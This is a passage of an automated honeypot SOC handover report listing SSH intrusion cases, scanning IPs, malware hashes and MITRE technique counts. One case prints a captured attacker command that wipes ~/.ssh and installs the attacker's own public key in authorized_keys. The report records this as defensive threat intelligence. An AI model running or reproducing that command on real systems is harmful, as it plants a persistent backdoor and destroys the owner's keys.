| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:28:54` | `cowrie.session.connect` |
| `2026-06-05 16:28:54` | `cowrie.client.version` |
| `2026-06-05 16:28:54` | `cowrie.client.kex` |
| `2026-06-05 16:28:55` | `cowrie.login.success` |
| `2026-06-05 16:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06de6a180558

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:29 |
| **Last Seen** | 2026-06-05 16:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:29:27` | `cowrie.session.connect` |
| `2026-06-05 16:29:27` | `cowrie.client.version` |
| `2026-06-05 16:29:27` | `cowrie.client.kex` |
| `2026-06-05 16:29:29` | `cowrie.login.success` |
| `2026-06-05 16:29:30` | `cowrie.session.params` |
| `2026-06-05 16:29:30` | `cowrie.command.input` |
| `2026-06-05 16:29:30` | `cowrie.command.failed` |
| `2026-06-05 16:29:30` | `cowrie.log.closed` |
| `2026-06-05 16:29:31` | `cowrie.session.params` |
| `2026-06-05 16:29:31` | `cowrie.command.input` |
| `2026-06-05 16:29:31` | `cowrie.session.file_download` |
| `2026-06-05 16:29:31` | `cowrie.log.closed` |
| `2026-06-05 16:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd8b30339fc1

| Field | Detail |
|---|---|
| **Source IP** | `107.174.82[.]77` |
| **First Seen** | 2026-06-05 16:29 |
| **Last Seen** | 2026-06-05 16:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 16:29:35` | `cowrie.session.connect` |
| `2026-06-05 16:29:35` | `cowrie.client.version` |
| `2026-06-05 16:29:35` | `cowrie.client.kex` |
| `2026-06-05 16:29:36` | `cowrie.login.success` |
| `2026-06-05 16:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.174.82[.]77` to AbuseIPDB if not already reported
- [ ] Block `107.174.82[.]77` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `72.47.208[.]106` | **63** | 2026-06-05 12:44 | 2026-06-05 13:53 | 31m | 0 | `T1592` | 🟠 MEDIUM |
| `107.174.82[.]77` | **30** | 2026-06-05 15:58 | 2026-06-05 16:29 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `156.245.144[.]121` | **30** | 2026-06-05 15:19 | 2026-06-05 16:25 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `81.30.212[.]94` | **30** | 2026-06-05 13:30 | 2026-06-05 14:18 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `202.70.139[.]75` | **25** | 2026-06-05 15:24 | 2026-06-05 15:29 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `203.205.37[.]233` | **25** | 2026-06-05 15:37 | 2026-06-05 16:25 | 4m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `41.111.178[.]165` | **21** | 2026-06-05 12:45 | 2026-06-05 13:26 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.117.56[.]120` | **20** | 2026-06-05 12:55 | 2026-06-05 13:13 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `166.62.102[.]109` | **13** | 2026-06-05 13:02 | 2026-06-05 16:20 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `34.71.30[.]159` | **6** | 2026-06-05 13:28 | 2026-06-05 14:48 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `202.70.78[.]237` | **5** | 2026-06-05 13:09 | 2026-06-05 14:31 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `180.165.31[.]253` | **4** | 2026-06-05 15:33 | 2026-06-05 15:44 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.191[.]5` | **3** | 2026-06-05 14:00 | 2026-06-05 14:11 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `103.180.213[.]153` | 1 | 2026-06-05 16:14 | 2026-06-05 16:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.250.151[.]241` | 1 | 2026-06-05 16:13 | 2026-06-05 16:13 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.54.101[.]216` | 1 | 2026-06-05 13:08 | 2026-06-05 13:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.181[.]42` | 1 | 2026-06-05 16:10 | 2026-06-05 16:10 | 10s | 0 | `T1592` | 🟢 LOW |
| `114.220.176[.]69` | 1 | 2026-06-05 13:23 | 2026-06-05 13:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.113[.]93` | 1 | 2026-06-05 13:26 | 2026-06-05 13:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.172[.]63` | 1 | 2026-06-05 15:21 | 2026-06-05 15:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.122[.]180` | 1 | 2026-06-05 13:26 | 2026-06-05 13:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.184[.]206` | 1 | 2026-06-05 13:03 | 2026-06-05 13:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `18.212.182[.]85` | 1 | 2026-06-05 13:11 | 2026-06-05 13:11 | 1s | 0 | `T1592` | 🟢 LOW |
| `182.44.4[.]202` | 1 | 2026-06-05 15:09 | 2026-06-05 15:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]201` | 1 | 2026-06-05 16:17 | 2026-06-05 16:17 | 2s | 0 | `T1592` | 🟢 LOW |
| `194.74.196[.]10` | 1 | 2026-06-05 16:06 | 2026-06-05 16:06 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.47.82[.]173` | 1 | 2026-06-05 15:03 | 2026-06-05 15:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `218.161.28[.]175` | 1 | 2026-06-05 15:53 | 2026-06-05 15:54 | 31s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]164` | 1 | 2026-06-05 14:02 | 2026-06-05 14:02 | 9s | 0 | `T1592` | 🟢 LOW |
| `82.208.20[.]10` | 1 | 2026-06-05 16:10 | 2026-06-05 16:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `166.62.102[.]109` | US | GoDaddy.com, LLC | **100** ⚠️ | 10 |
| `103.117.56[.]120` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |
| `106.13.181[.]42` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `115.190.172[.]63` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `211.47.82[.]173` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 14 |
| `72.47.208[.]106` | US | GoDaddy.com, LLC | **100** ⚠️ | 7 |
| `107.174.82[.]77` | US | HostPapa | **100** ⚠️ | 5 |
| `18.212.182[.]85` | US | Amazon Technologies Inc. | **100** ⚠️ | 7 |
| `218.161.28[.]175` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 2 |
| `103.54.101[.]216` | IN | Digitax India Communications Pvt Ltd. | **100** ⚠️ | 14 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 329 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 189 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 124 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 62 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 62 |

---

## 🔕 False Positive Summary (56 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 11 below threshold 25 | 25 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 462 cases |
| Tool 34  | Credential Extractor        | ✅ 313 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 36 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 56 filtered (12.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 114 priority case(s) shown individually · 30 recon entry/entries in table (13 group(s) consolidating 275 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-05T16:31:53Z_
